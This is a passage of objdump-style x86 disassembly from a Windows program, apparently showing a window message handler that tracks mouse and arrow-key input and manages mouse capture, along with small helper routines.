  405296:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  405299:	0f 84 7c 03 00 00    	je     0x40561b
  40529f:	8d 47 10             	lea    0x10(%edi),%eax
  4052a2:	83 e6 0f             	and    $0xf,%esi
  4052a5:	50                   	push   %eax
  4052a6:	ff 75 08             	push   0x8(%ebp)
  4052a9:	89 77 30             	mov    %esi,0x30(%edi)
  4052ac:	8b 35 ec a7 40 00    	mov    0x40a7ec,%esi
  4052b2:	c7 07 01 00 00 00    	movl   $0x1,(%edi)
  4052b8:	ff d6                	call   *%esi
  4052ba:	8d 47 20             	lea    0x20(%edi),%eax
  4052bd:	50                   	push   %eax
  4052be:	ff 75 08             	push   0x8(%ebp)
  4052c1:	ff d6                	call   *%esi
  4052c3:	8b 35 e4 a7 40 00    	mov    0x40a7e4,%esi
  4052c9:	6a 3d                	push   $0x3d
  4052cb:	89 5f 34             	mov    %ebx,0x34(%edi)
  4052ce:	89 5f 38             	mov    %ebx,0x38(%edi)
  4052d1:	ff d6                	call   *%esi
  4052d3:	6a 3e                	push   $0x3e
  4052d5:	89 47 3c             	mov    %eax,0x3c(%edi)
  4052d8:	ff d6                	call   *%esi
  4052da:	6a f0                	push   $0xfffffff0
  4052dc:	ff 75 08             	push   0x8(%ebp)
  4052df:	89 47 40             	mov    %eax,0x40(%edi)
  4052e2:	ff 15 90 a7 40 00    	call   *0x40a790
  4052e8:	a9 00 00 80 00       	test   $0x800000,%eax
  4052ed:	74 08                	je     0x4052f7
  4052ef:	6a 05                	push   $0x5
  4052f1:	ff d6                	call   *%esi
  4052f3:	6a 06                	push   $0x6
  4052f5:	eb 17                	jmp    0x40530e
  4052f7:	6a ec                	push   $0xffffffec
  4052f9:	ff 75 08             	push   0x8(%ebp)
  4052fc:	ff 15 90 a7 40 00    	call   *0x40a790
  405302:	66 a9 00 01          	test   $0x100,%ax
  405306:	74 10                	je     0x405318
  405308:	6a 2d                	push   $0x2d
  40530a:	ff d6                	call   *%esi
  40530c:	6a 2e                	push   $0x2e
  40530e:	89 47 44             	mov    %eax,0x44(%edi)
  405311:	ff d6                	call   *%esi
  405313:	89 47 48             	mov    %eax,0x48(%edi)
  405316:	eb 06                	jmp    0x40531e
  405318:	89 5f 44             	mov    %ebx,0x44(%edi)
  40531b:	89 5f 48             	mov    %ebx,0x48(%edi)
  40531e:	6a 22                	push   $0x22
  405320:	ff d6                	call   *%esi
  405322:	6a 23                	push   $0x23
  405324:	89 47 4c             	mov    %eax,0x4c(%edi)
  405327:	ff d6                	call   *%esi
  405329:	6a 3b                	push   $0x3b
  40532b:	89 47 50             	mov    %eax,0x50(%edi)
  40532e:	ff d6                	call   *%esi
  405330:	6a 3c                	push   $0x3c
  405332:	89 47 54             	mov    %eax,0x54(%edi)
  405335:	ff d6                	call   *%esi
  405337:	8b 35 64 a7 40 00    	mov    0x40a764,%esi
  40533d:	89 47 58             	mov    %eax,0x58(%edi)
  405340:	8d 47 34             	lea    0x34(%edi),%eax
  405343:	50                   	push   %eax
  405344:	53                   	push   %ebx
  405345:	6a 24                	push   $0x24
  405347:	ff 75 08             	push   0x8(%ebp)
  40534a:	ff d6                	call   *%esi
  40534c:	6a 01                	push   $0x1
  40534e:	ff 15 28 a8 40 00    	call   *0x40a828
  405354:	66 85 c0             	test   %ax,%ax
  405357:	75 0d                	jne    0x405366
  405359:	53                   	push   %ebx
  40535a:	6a 01                	push   $0x1
  40535c:	68 01 02 00 00       	push   $0x201
  405361:	ff 75 08             	push   0x8(%ebp)
  405364:	ff d6                	call   *%esi
  405366:	ff 75 08             	push   0x8(%ebp)
  405369:	ff 15 2c a8 40 00    	call   *0x40a82c
  40536f:	53                   	push   %ebx
  405370:	53                   	push   %ebx
  405371:	68 31 02 00 00       	push   $0x231
  405376:	ff 75 08             	push   0x8(%ebp)
  405379:	ff 15 94 a7 40 00    	call   *0x40a794
  40537f:	39 5f 30             	cmp    %ebx,0x30(%edi)
  405382:	75 32                	jne    0x4053b6
  405384:	c7 47 04 01 00 00 00 	movl   $0x1,0x4(%edi)
  40538b:	83 c7 08             	add    $0x8,%edi
  40538e:	57                   	push   %edi
  40538f:	ff 15 30 a8 40 00    	call   *0x40a830
  405395:	68 40 80 00 00       	push   $0x8040
  40539a:	53                   	push   %ebx
  40539b:	53                   	push   %ebx
  40539c:	6a 02                	push   $0x2
  40539e:	68 86 7f 00 00       	push   $0x7f86
  4053a3:	53                   	push   %ebx
  4053a4:	ff 15 14 a8 40 00    	call   *0x40a814
  4053aa:	50                   	push   %eax
  4053ab:	ff 15 18 a8 40 00    	call   *0x40a818
  4053b1:	e9 62 02 00 00       	jmp    0x405618
  4053b6:	89 5f 04             	mov    %ebx,0x4(%edi)
  4053b9:	e9 5a 02 00 00       	jmp    0x405618
  4053be:	8b 45 0c             	mov    0xc(%ebp),%eax
  4053c1:	3d 00 02 00 00       	cmp    $0x200,%eax
  4053c6:	75 61                	jne    0x405429
  4053c8:	8b 45 14             	mov    0x14(%ebp),%eax
  4053cb:	0f bf c8             	movswl %ax,%ecx
  4053ce:	c1 e8 10             	shr    $0x10,%eax
  4053d1:	0f bf c0             	movswl %ax,%eax
  4053d4:	89 5f 04             	mov    %ebx,0x4(%edi)
  4053d7:	6a 01                	push   $0x1
  4053d9:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4053dc:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4053df:	50                   	push   %eax
  4053e0:	53                   	push   %ebx
  4053e1:	ff 75 08             	push   0x8(%ebp)
  4053e4:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4053e7:	ff 15 1c a8 40 00    	call   *0x40a81c
  4053ed:	ff 75 f4             	push   -0xc(%ebp)
  4053f0:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4053f3:	8b c7                	mov    %edi,%eax
  4053f5:	e8 c7 fc ff ff       	call   0x4050c1
  4053fa:	59                   	pop    %ecx
  4053fb:	8d 77 10             	lea    0x10(%edi),%esi
  4053fe:	56                   	push   %esi
  4053ff:	ff 77 30             	push   0x30(%edi)
  405402:	68 14 02 00 00       	push   $0x214
  405407:	ff 75 08             	push   0x8(%ebp)
  40540a:	ff 15 64 a7 40 00    	call   *0x40a764
  405410:	83 ec 10             	sub    $0x10,%esp
  405413:	8b fc                	mov    %esp,%edi
  405415:	ff 75 08             	push   0x8(%ebp)
  405418:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405419:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40541a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40541b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40541c:	e8 82 fd ff ff       	call   0x4051a3
  405421:	83 c4 14             	add    $0x14,%esp
  405424:	e9 ef 01 00 00       	jmp    0x405618
  405429:	3d 00 01 00 00       	cmp    $0x100,%eax
  40542e:	0f 85 b3 01 00 00    	jne    0x4055e7
  405434:	8b 45 10             	mov    0x10(%ebp),%eax
  405437:	83 e8 0d             	sub    $0xd,%eax
  40543a:	0f 84 9f 01 00 00    	je     0x4055df
  405440:	83 e8 0e             	sub    $0xe,%eax
  405443:	0f 84 96 01 00 00    	je     0x4055df
  405449:	6a 0a                	push   $0xa
  40544b:	5e                   	pop    %esi
  40544c:	2b c6                	sub    %esi,%eax
  40544e:	0f 84 36 01 00 00    	je     0x40558a
  405454:	48                   	dec    %eax
  405455:	0f 84 d2 00 00 00    	je     0x40552d
  40545b:	48                   	dec    %eax
  40545c:	74 7c                	je     0x4054da
  40545e:	48                   	dec    %eax
  40545f:	0f 85 b6 01 00 00    	jne    0x40561b
  405465:	8d 45 f0             	lea    -0x10(%ebp),%eax
  405468:	50                   	push   %eax
  405469:	ff 15 30 a8 40 00    	call   *0x40a830
  40546f:	8b 4f 30             	mov    0x30(%edi),%ecx
  405472:	3b cb                	cmp    %ebx,%ecx
  405474:	75 17                	jne    0x40548d
  405476:	8b 47 1c             	mov    0x1c(%edi),%eax
  405479:	48                   	dec    %eax
  40547a:	48                   	dec    %eax
  40547b:	c7 47 30 06 00 00 00 	movl   $0x6,0x30(%edi)
  405482:	50                   	push   %eax
  405483:	ff 75 f0             	push   -0x10(%ebp)
  405486:	68 85 7f 00 00       	push   $0x7f85
  40548b:	eb 3b                	jmp    0x4054c8
  40548d:	6a 02                	push   $0x2
  40548f:	58                   	pop    %eax
  405490:	3b c8                	cmp    %eax,%ecx
  405492:	75 1a                	jne    0x4054ae
  405494:	8b 4f 1c             	mov    0x1c(%edi),%ecx
  405497:	2b c8                	sub    %eax,%ecx
  405499:	51                   	push   %ecx
  40549a:	8b 4f 18             	mov    0x18(%edi),%ecx
  40549d:	c7 47 30 08 00 00 00 	movl   $0x8,0x30(%edi)
  4054a4:	2b c8                	sub    %eax,%ecx
  4054a6:	51                   	push   %ecx
  4054a7:	68 82 7f 00 00       	push   $0x7f82
  4054ac:	eb 1a                	jmp    0x4054c8
  4054ae:	83 f9 01             	cmp    $0x1,%ecx
  4054b1:	75 1f                	jne    0x4054d2
  4054b3:	8b 4f 1c             	mov    0x1c(%edi),%ecx
  4054b6:	2b c8                	sub    %eax,%ecx
  4054b8:	51                   	push   %ecx
  4054b9:	ff 77 10             	push   0x10(%edi)
  4054bc:	c7 47 30 07 00 00 00 	movl   $0x7,0x30(%edi)
  4054c3:	68 83 7f 00 00       	push   $0x7f83
  4054c8:	e8 c6 fb ff ff       	call   0x405093
  4054cd:	e9 08 01 00 00       	jmp    0x4055da
  4054d2:	01 75 f4             	add    %esi,-0xc(%ebp)
  4054d5:	e9 f0 00 00 00       	jmp    0x4055ca
  4054da:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4054dd:	50                   	push   %eax
  4054de:	ff 15 30 a8 40 00    	call   *0x40a830
  4054e4:	8b 47 30             	mov    0x30(%edi),%eax
  4054e7:	3b c3                	cmp    %ebx,%eax
  4054e9:	75 16                	jne    0x405501
  4054eb:	8b 4f 18             	mov    0x18(%edi),%ecx
  4054ee:	6a 02                	push   $0x2
  4054f0:	58                   	pop    %eax
  4054f1:	89 47 30             	mov    %eax,0x30(%edi)
  4054f4:	ff 75 f4             	push   -0xc(%ebp)
  4054f7:	2b c8                	sub    %eax,%ecx
  4054f9:	51                   	push   %ecx
  4054fa:	68 84 7f 00 00       	push   $0x7f84
  4054ff:	eb c7                	jmp    0x4054c8
  405501:	83 f8 03             	cmp    $0x3,%eax
  405504:	75 12                	jne    0x405518
  405506:	8b 47 18             	mov    0x18(%edi),%eax
  405509:	ff 77 14             	push   0x14(%edi)
  40550c:	48                   	dec    %eax
  40550d:	48                   	dec    %eax
  40550e:	c7 47 30 05 00 00 00 	movl   $0x5,0x30(%edi)
  405515:	50                   	push   %eax
  405516:	eb ab                	jmp    0x4054c3
  405518:	83 f8 06             	cmp    $0x6,%eax
  40551b:	75 08                	jne    0x405525
  40551d:	6a 02                	push   $0x2
  40551f:	58                   	pop    %eax
  405520:	e9 6f ff ff ff       	jmp    0x405494
  405525:	01 75 f0             	add    %esi,-0x10(%ebp)
  405528:	e9 9d 00 00 00       	jmp    0x4055ca
  40552d:	8d 45 f0             	lea    -0x10(%ebp),%eax
  405530:	50                   	push   %eax
  405531:	ff 15 30 a8 40 00    	call   *0x40a830
  405537:	8b 4f 30             	mov    0x30(%edi),%ecx
  40553a:	3b cb                	cmp    %ebx,%ecx
  40553c:	75 0f                	jne    0x40554d
  40553e:	ff 77 14             	push   0x14(%edi)
  405541:	c7 47 30 03 00 00 00 	movl   $0x3,0x30(%edi)
  405548:	e9 36 ff ff ff       	jmp    0x405483
  40554d:	6a 02                	push   $0x2
  40554f:	58                   	pop    %eax
  405550:	3b c8                	cmp    %eax,%ecx
  405552:	75 15                	jne    0x405569
  405554:	8b 4f 18             	mov    0x18(%edi),%ecx
  405557:	ff 77 14             	push   0x14(%edi)
  40555a:	2b c8                	sub    %eax,%ecx
  40555c:	c7 47 30 05 00 00 00 	movl   $0x5,0x30(%edi)
  405563:	51                   	push   %ecx
  405564:	e9 5a ff ff ff       	jmp    0x4054c3
  405569:	83 f9 01             	cmp    $0x1,%ecx
  40556c:	75 17                	jne    0x405585
  40556e:	8b 4f 14             	mov    0x14(%edi),%ecx
  405571:	03 c8                	add    %eax,%ecx
  405573:	51                   	push   %ecx
  405574:	8b 4f 10             	mov    0x10(%edi),%ecx
  405577:	c7 47 30 04 00 00 00 	movl   $0x4,0x30(%edi)
  40557e:	03 c8                	add    %eax,%ecx
  405580:	e9 21 ff ff ff       	jmp    0x4054a6
  405585:	29 75 f4             	sub    %esi,-0xc(%ebp)
  405588:	eb 40                	jmp    0x4055ca
  40558a:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40558d:	50                   	push   %eax
  40558e:	ff 15 30 a8 40 00    	call   *0x40a830
  405594:	8b 47 30             	mov    0x30(%edi),%eax
  405597:	3b c3                	cmp    %ebx,%eax
  405599:	75 12                	jne    0x4055ad
  40559b:	c7 47 30 01 00 00 00 	movl   $0x1,0x30(%edi)
  4055a2:	ff 75 f4             	push   -0xc(%ebp)
  4055a5:	ff 77 10             	push   0x10(%edi)
  4055a8:	e9 4d ff ff ff       	jmp    0x4054fa
  4055ad:	83 f8 03             	cmp    $0x3,%eax
  4055b0:	75 05                	jne    0x4055b7
  4055b2:	6a 02                	push   $0x2
  4055b4:	58                   	pop    %eax
  4055b5:	eb b7                	jmp    0x40556e
  4055b7:	83 f8 06             	cmp    $0x6,%eax
  4055ba:	75 0b                	jne    0x4055c7
  4055bc:	8b 47 1c             	mov    0x1c(%edi),%eax
  4055bf:	48                   	dec    %eax
  4055c0:	48                   	dec    %eax
  4055c1:	50                   	push   %eax
  4055c2:	e9 f2 fe ff ff       	jmp    0x4054b9
  4055c7:	29 75 f0             	sub    %esi,-0x10(%ebp)
  4055ca:	ff 75 f4             	push   -0xc(%ebp)
  4055cd:	8b c7                	mov    %edi,%eax
  4055cf:	ff 75 f0             	push   -0x10(%ebp)
  4055d2:	ff 75 08             	push   0x8(%ebp)
  4055d5:	e8 17 fc ff ff       	call   0x4051f1
  4055da:	83 c4 0c             	add    $0xc,%esp
  4055dd:	eb 3c                	jmp    0x40561b
  4055df:	ff 15 34 a8 40 00    	call   *0x40a834
  4055e5:	eb 31                	jmp    0x405618
  4055e7:	3d 02 02 00 00       	cmp    $0x202,%eax
  4055ec:	74 f1                	je     0x4055df
  4055ee:	3d 15 02 00 00       	cmp    $0x215,%eax
  4055f3:	75 26                	jne    0x40561b
  4055f5:	53                   	push   %ebx
  4055f6:	53                   	push   %ebx
  4055f7:	68 32 02 00 00       	push   $0x232
  4055fc:	ff 75 08             	push   0x8(%ebp)
  4055ff:	ff 15 94 a7 40 00    	call   *0x40a794
  405605:	39 5f 04             	cmp    %ebx,0x4(%edi)
  405608:	89 1f                	mov    %ebx,(%edi)
  40560a:	74 0c                	je     0x405618
  40560c:	ff 77 0c             	push   0xc(%edi)
  40560f:	ff 77 08             	push   0x8(%edi)
  405612:	ff 15 10 a8 40 00    	call   *0x40a810
  405618:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40561b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40561e:	5f                   	pop    %edi
  40561f:	5e                   	pop    %esi
  405620:	5b                   	pop    %ebx
  405621:	c9                   	leave
  405622:	c2 10 00             	ret    $0x10
  405625:	55                   	push   %ebp
  405626:	8b ec                	mov    %esp,%ebp
  405628:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40562c:	56                   	push   %esi
  40562d:	be d1 d0 d0 d0       	mov    $0xd0d0d0d1,%esi
  405632:	74 4c                	je     0x405680
  405634:	57                   	push   %edi
  405635:	68 68 90 40 00       	push   $0x409068
  40563a:	ff 75 08             	push   0x8(%ebp)
  40563d:	ff 15 c0 a7 40 00    	call   *0x40a7c0
  405643:	6a f4                	push   $0xfffffff4
  405645:	ff 75 08             	push   0x8(%ebp)
  405648:	8b f8                	mov    %eax,%edi
  40564a:	ff 15 90 a7 40 00    	call   *0x40a790
  405650:	3b f8                	cmp    %eax,%edi
  405652:	75 2b                	jne    0x40567f
  405654:	57                   	push   %edi
  405655:	ff 35 24 b4 40 00    	push   0x40b424
  40565b:	e8 30 10 00 00       	call   0x406690
  405660:	85 c0                	test   %eax,%eax
  405662:	74 1b                	je     0x40567f
  405664:	8b 48 04             	mov    0x4(%eax),%ecx
  405667:	8b 49 08             	mov    0x8(%ecx),%ecx
  40566a:	85 c9                	test   %ecx,%ecx
  40566c:	74 11                	je     0x40567f
  40566e:	ff 75 18             	push   0x18(%ebp)
  405671:	ff 75 14             	push   0x14(%ebp)
  405674:	ff 75 10             	push   0x10(%ebp)
  405677:	ff 75 0c             	push   0xc(%ebp)
  40567a:	50                   	push   %eax
  40567b:	ff d1                	call   *%ecx
  40567d:	8b f0                	mov    %eax,%esi
  40567f:	5f                   	pop    %edi
  405680:	8b c6                	mov    %esi,%eax
  405682:	5e                   	pop    %esi
  405683:	5d                   	pop    %ebp
  405684:	c3                   	ret
  405685:	53                   	push   %ebx
  405686:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  40568a:	56                   	push   %esi
  40568b:	8b 74 24 0c          	mov    0xc(%esp),%esi
  40568f:	8b 46 1c             	mov    0x1c(%esi),%eax
  405692:	85 c0                	test   %eax,%eax
  405694:	57                   	push   %edi
  405695:	8b 7c 24 18          	mov    0x18(%esp),%edi
  405699:	74 0a                	je     0x4056a5
  40569b:	39 58 04             	cmp    %ebx,0x4(%eax)
  40569e:	75 05                	jne    0x4056a5
  4056a0:	39 78 08             	cmp    %edi,0x8(%eax)
  4056a3:	74 2e                	je     0x4056d3
  4056a5:	6a 0c                	push   $0xc
  4056a7:	6a 00                	push   $0x0
  4056a9:	ff 35 f8 b0 40 00    	push   0x40b0f8
  4056af:	ff 15 e0 a6 40 00    	call   *0x40a6e0
  4056b5:	85 c0                	test   %eax,%eax
  4056b7:	74 1a                	je     0x4056d3
  4056b9:	83 20 00             	andl   $0x0,(%eax)
  4056bc:	89 58 04             	mov    %ebx,0x4(%eax)
  4056bf:	89 78 08             	mov    %edi,0x8(%eax)
  4056c2:	8b 4e 1c             	mov    0x1c(%esi),%ecx
  4056c5:	85 c9                	test   %ecx,%ecx
  4056c7:	75 05                	jne    0x4056ce
  4056c9:	89 46 18             	mov    %eax,0x18(%esi)
  4056cc:	eb 02                	jmp    0x4056d0
  4056ce:	89 01                	mov    %eax,(%ecx)
  4056d0:	89 46 1c             	mov    %eax,0x1c(%esi)
  4056d3:	5f                   	pop    %edi
  4056d4:	5e                   	pop    %esi
  4056d5:	5b                   	pop    %ebx
  4056d6:	c2 0c 00             	ret    $0xc
  4056d9:	6a 00                	push   $0x0
  4056db:	6a 00                	push   $0x0
  4056dd:	6a 15                	push   $0x15
  4056df:	ff 74 24 10          	push   0x10(%esp)
  4056e3:	ff 15 64 a7 40 00    	call   *0x40a764
  4056e9:	33 c0                	xor    %eax,%eax
  4056eb:	40                   	inc    %eax
  4056ec:	c2 08 00             	ret    $0x8
  4056ef:	55                   	push   %ebp
  4056f0:	8b ec                	mov    %esp,%ebp
  4056f2:	83 ec 18             	sub    $0x18,%esp
  4056f5:	53                   	push   %ebx
  4056f6:	56                   	push   %esi
  4056f7:	57                   	push   %edi
  4056f8:	ff 35 30 b4 40 00    	push   0x40b430
  4056fe:	33 db                	xor    %ebx,%ebx
  405700:	e8 28 0d 00 00       	call   0x40642d
  405705:	8b 7d 14             	mov    0x14(%ebp),%edi
  405708:	57                   	push   %edi
  405709:	ff 75 10             	push   0x10(%ebp)
  40570c:	8b f0                	mov    %eax,%esi
  40570e:	ff 75 0c             	push   0xc(%ebp)
  405711:	ff 75 08             	push   0x8(%ebp)
  405714:	e8 26 fb ff ff       	call   0x40523f
  405719:	3d d1 d0 d0 d0       	cmp    $0xd0d0d0d1,%eax
  40571e:	0f 85 f4 03 00 00    	jne    0x405b18
  405724:	8b 45 08             	mov    0x8(%ebp),%eax
  405727:	85 c0                	test   %eax,%eax
  405729:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40572c:	74 3f                	je     0x40576d
  40572e:	68 70 90 40 00       	push   $0x409070
  405733:	ff 75 f8             	push   -0x8(%ebp)
  405736:	ff 15 c0 a7 40 00    	call   *0x40a7c0
  40573c:	85 c0                	test   %eax,%eax
  40573e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405741:	75 10                	jne    0x405753
  405743:	ff 75 f8             	push   -0x8(%ebp)
  405746:	ff 15 bc a7 40 00    	call   *0x40a7bc
  40574c:	85 c0                	test   %eax,%eax
  40574e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405751:	75 db                	jne    0x40572e
